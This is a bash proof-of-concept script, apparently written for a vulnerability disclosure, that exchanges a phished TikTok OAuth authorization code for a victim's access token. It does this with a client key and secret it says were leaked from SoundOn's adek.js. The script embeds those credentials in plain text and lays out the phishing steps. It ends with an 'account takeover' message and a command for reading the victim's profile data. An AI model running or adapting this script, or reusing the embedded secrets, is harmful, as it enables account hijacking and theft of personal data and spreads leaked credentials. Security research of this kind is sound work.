#!/bin/bash
# === PoC: TikTok OAuth Token Exchange ===
# Uses the LEAKED TikTok client credentials from SoundOn's adek.js
# to exchange a captured authorization code for an access token.

LEAKED_CLIENT_KEY="awulj3e36brrh086"
LEAKED_CLIENT_SECRET="e63acb9afab646ee9340f16a2380b1ed"
TOKEN_URL="https://open-api.tiktok.com/oauth/access_token/"

if [ -z "$1" ]; then
  echo "Usage: $0 <AUTHORIZATION_CODE>"
  echo ""
  echo "Step 1: Victim visits your phishing page (index.html)"
  echo "Step 2: Victim authorizes the TikTok OAuth app"
  echo "Step 3: TikTok redirects to callback.html with ?code=AUTHORIZATION_CODE"
  echo "Step 4: Run this script with the captured code"
  echo ""
  echo "Example: $0 AQBx8sY_abcdefghijklmnopqrstuvwxyz1234567890"
  exit 1
fi

AUTH_CODE="$1"

echo "============================================"
echo " TikTok OAuth Token Exchange (PoC)"
echo "============================================"
echo ""
echo "Using LEAKED credentials from SoundOn adek.js:"
echo "  client_key:    $LEAKED_CLIENT_KEY"
echo "  client_secret: $LEAKED_CLIENT_SECRET"
echo ""
echo "Authorization code: ${AUTH_CODE:0:20}..."
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" "$TOKEN_URL" \
  -H "Content-Type: application/json" \
  -d "{
    \"client_key\": \"$LEAKED_CLIENT_KEY\",
    \"client_secret\": \"$LEAKED_CLIENT_SECRET\",
    \"code\": \"$AUTH_CODE\",
    \"grant_type\": \"authorization_code\"
  }" --max-time 15 2>/dev/null)

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status: $HTTP_CODE"
echo ""
echo "Response:"
echo "$BODY" | python3 -m json.tool 2>/dev/null || echo "$BODY"

# Check if successful
if echo "$BODY" | grep -q "access_token"; then
  echo ""
  echo "============================================"
  echo " ACCOUNT TAKEOVER SUCCESSFUL "
  echo "============================================"
  echo ""
  ACCESS_TOKEN=$(echo "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['access_token'])" 2>/dev/null)
  OPEN_ID=$(echo "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['open_id'])" 2>/dev/null)
  echo "Access Token: $ACCESS_TOKEN"
  echo "Open ID:      $OPEN_ID"
  echo ""
  echo "Now use the access token to access victim's TikTok data:"
  echo "  curl 'https://open-api.tiktok.com/user/info/?fields=open_id,union_id,avatar_url,display_name' \\"
  echo "    -H 'access-token: $ACCESS_TOKEN'"
  echo ""
  echo "Saved evidence to token_response.json"
  echo "$BODY" > token_response.json
elif echo "$BODY" | grep -q "10007"; then
  echo ""
  echo "[INFO] Error 10007 = Authorization code expired"
  echo "This confirms the client_key and client_secret are VALID."
  echo "The code just needs to be captured within ~60 seconds of generation."
  echo ""
  echo "To fully reproduce:"
  echo "  1. Open index.html in a browser"
  echo "  2. Log into TikTok when prompted"
  echo "  3. The code will appear on callback.html"
  echo "  4. Immediately run this script with that code"
elif echo "$BODY" | grep -q "10002"; then
  echo ""
  echo "[FAIL] Error 10002 = Invalid client_key"
  echo "TikTok rejected the credentials. They may have been rotated."
fi
